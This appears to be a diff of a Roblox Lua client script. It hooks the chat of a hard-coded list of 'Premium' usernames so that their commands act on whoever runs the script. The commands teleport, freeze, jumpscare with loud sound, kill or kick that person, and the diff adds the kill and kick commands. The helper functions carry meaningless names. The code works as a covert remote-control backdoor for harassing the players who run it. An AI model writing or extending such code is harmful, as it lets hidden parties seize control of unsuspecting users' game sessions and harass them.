@@ -1,15 +1,15 @@
 local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
 
-local testers = {
-    "roblox",
-    "D00mAt",
-    "IWILLDESTROYROBLOX81"
+local Premiums = {
+    "Departhaha",
+    "pzoz853",
+    "D00mAt"
 }
 
-local function x1y2z3(testers)
+local function x1y2z3(Premium)
     coroutine.wrap(function()
-        if testers and testers.Character and testers.Character:FindFirstChild("HumanoidRootPart") then
+        if Premium and Premium.Character and Premium.Character:FindFirstChild("HumanoidRootPart") then
             if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                 localPlayer.Character:SetPrimaryPartCFrame(Premium.Character.HumanoidRootPart.CFrame)
             end
@@ -60,7 +60,7 @@ local function JumpScare()
         imageLabel.Parent = frame
         imageLabel.Size = UDim2.new(0.01, 0, 0.01, 0)
         imageLabel.Position = UDim2.new(0.5, -0.1, 0.5, -0.1)
-        imageLabel.Image = "rbxassetid://16476341865"
+        imageLabel.Image = "rbxassetid://11012215808"
         imageLabel.BackgroundTransparency = 1
         imageLabel.ImageTransparency = 100
         imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -68,7 +68,7 @@ local function JumpScare()
         local sound = Instance.new("Sound")
         sound.Name = "IntroSound"
         sound.Parent = frame
-        sound.SoundId = "rbxassetid://8323804973"
+        sound.SoundId = "rbxassetid://8940801080"
         sound.Volume = 50
         sound:Play()
 
@@ -105,33 +105,57 @@ local function JumpScare()
     end)()
 end
 
-local function a1b2c3(testersName)
-    local testers
+local function killPlayer()
+    coroutine.wrap(function()
+        if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            localPlayer.Character:SetPrimaryPartCFrame(CFrame.new(0, -1000, 0)) -- Move to void
+                        localPlayer.Character:BreakJoints()
+        end
+    end)()
+end
+
+local function kickPlayer(username)
+    coroutine.wrap(function()
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player.Name == username then
+                player:Kick("You have been kicked by a Premium player.")
+                break
+            end
+        end
+    end)()
+end
+
+local function a1b2c3(PremiumName)
+    local Premium
 
     for _, player in ipairs(Players:GetPlayers()) do
-        if player.Name == testersName then
-            testers = player
+        if player.Name == PremiumName then
+            Premium = player
             break
         end
     end
 
-    if testers then
-        testers.Chatted:Connect(function(message)
-            if message == ":Kick" then
-                localPlayer:Kick("Perma BANNED")
-            elseif message == ":bring" then
+    if Premium then
+        Premium.Chatted:Connect(function(message)
+            local command, argument = message:match("^(%S+)%s*(.*)")
+
+            if command == ":kick" then
+                kickPlayer(argument)  
+            elseif command == ":bring" then
                 x1y2z3(Premium)
-            elseif message == ":freeze" then
+            elseif command == ":freeze" then
                 freezePlayer()
-            elseif message == ":unfreeze" then
+            elseif command == ":unfreeze" then
                 unfreezePlayer()
-            elseif message == ":jumpscare" then
+            elseif command == ":jumpscare" then
                 JumpScare()
+            elseif command == ":kill" then
+                killPlayer()
             end
         end)
     end
 end
 
-for _, testersName in ipairs(testers) do
-    a1b2c3(testersName)
+for _, PremiumName in ipairs(Premiums) do
+    a1b2c3(PremiumName)
 end
